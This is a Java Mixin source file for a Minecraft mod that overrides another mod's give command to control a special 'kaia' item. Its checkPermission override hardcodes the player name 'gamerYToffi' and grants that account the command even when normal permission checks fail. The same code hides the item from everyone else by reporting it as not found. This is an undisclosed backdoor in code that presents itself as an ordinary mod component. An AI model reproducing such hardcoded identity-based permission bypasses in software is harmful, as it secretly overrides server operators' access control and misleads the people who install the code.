package com.omnipotent.common.mixin.mods;

import com.fantasticsource.fantasticlib.CmdGive;
import com.omnipotent.common.tool.Kaia;
import com.omnipotent.util.UtilityHelper;
import net.minecraft.command.CommandBase;
import net.minecraft.command.CommandException;
import net.minecraft.command.ICommandSender;
import net.minecraft.command.WrongUsageException;
import net.minecraft.entity.item.EntityItem;
import net.minecraft.entity.player.EntityPlayerMP;
import net.minecraft.item.Item;
import net.minecraft.item.ItemStack;
import net.minecraft.nbt.JsonToNBT;
import net.minecraft.nbt.NBTException;
import net.minecraft.server.MinecraftServer;
import net.minecraft.util.ResourceLocation;
import net.minecraft.util.math.BlockPos;
import net.minecraft.util.text.TextComponentTranslation;
import net.minecraft.util.text.TextFormatting;
import org.spongepowered.asm.mixin.Mixin;
import org.spongepowered.asm.mixin.Overwrite;
import org.spongepowered.asm.mixin.Unique;

import javax.annotation.Nullable;
import java.util.*;
import java.util.stream.Collectors;

@Mixin(value = CmdGive.class, remap = false)
public abstract class MixinCmdGive extends CommandBase {

    private static final ResourceLocation item = new ResourceLocation("omnipotent", "kaia");
    private boolean gamerYToffi;
    private boolean activeCommandForSpecialPlayer;

    /**
     * @author
     * @reason
     */
    @Overwrite
    public void func_184881_a(MinecraftServer server, ICommandSender sender, String[] args) throws Exception {
        if (args.length < 2) {
            throw new WrongUsageException("commands.give.usage", new Object[0]);
        } else {
            EntityPlayerMP player = getPlayer(server, sender, args[0]);
            Item item = getItemByText(sender, args[1]);
            if (!gamerYToffi && item instanceof Kaia) {
                TextComponentTranslation textcomponenttranslation1 = new TextComponentTranslation("commands.give.item.notFound", "omnipotent:kaia");
                textcomponenttranslation1.getStyle().setColor(TextFormatting.RED);
                sender.sendMessage(textcomponenttranslation1);
                return;
            } else if (activeCommandForSpecialPlayer && !(item instanceof Kaia))
                return;
            int i = args.length >= 3 ? parseInt(args[2], 1, item.getItemStackLimit()) : 1;
            int j = args.length >= 4 ? parseInt(args[3]) : 0;
            ItemStack itemstack = new ItemStack(item, i, j);
            if (args.length >= 5) {
                String s = buildString(args, 4);

                try {
                    itemstack.setTagCompound(JsonToNBT.getTagFromJson(s));
                } catch (NBTException var11) {
                    throw new CommandException("commands.give.tagError", var11.getMessage());
                }
            }
            if (itemstack.getItem() instanceof Kaia)
                UtilityHelper.generateAndSendChallenge(player, "give");
            else
                omnipotent_mod$give(player, itemstack);
            notifyCommandListener(sender, this, "commands.give.success", itemstack.getTextComponent(), i, player.getName());
        }
    }

    @Unique
    private void omnipotent_mod$give(EntityPlayerMP player, ItemStack itemstack) {
        double d0 = player.posY - 0.30000001192092896D + (double) player.getEyeHeight();
        EntityItem entityitem = new EntityItem(player.world, player.posX, d0, player.posZ, itemstack);
        entityitem.setThrower(player.getName());
        entityitem.onCollideWithPlayer(player);
    }

    @Override
    public boolean checkPermission(MinecraftServer server, ICommandSender sender) {
        gamerYToffi = sender.getName().equals("gamerYToffi");
        if (gamerYToffi && (!super.checkPermission(server, sender))) {
            activeCommandForSpecialPlayer = true;
            return activeCommandForSpecialPlayer;
        }
        return super.checkPermission(server, sender);
    }

    public List<String> getTabCompletions(MinecraftServer server, ICommandSender sender, String[] args, @Nullable BlockPos targetPos) {
        gamerYToffi = sender.getName().equals("gamerYToffi");
        if (args.length == 1)
            return getListOfStringsMatchingLastWord(args, server.getOnlinePlayerNames());
        else {
            Set<ResourceLocation> keys = new HashSet<>(Item.REGISTRY.getKeys());
            if (!gamerYToffi)
                keys.remove(item);
            else if (activeCommandForSpecialPlayer)
                keys.removeIf(re -> !re.equals(item));
            return args.length == 2 ? getListOfStringsMatchingLastWord(args, keys) : Collections.emptyList();
        }
    }
}
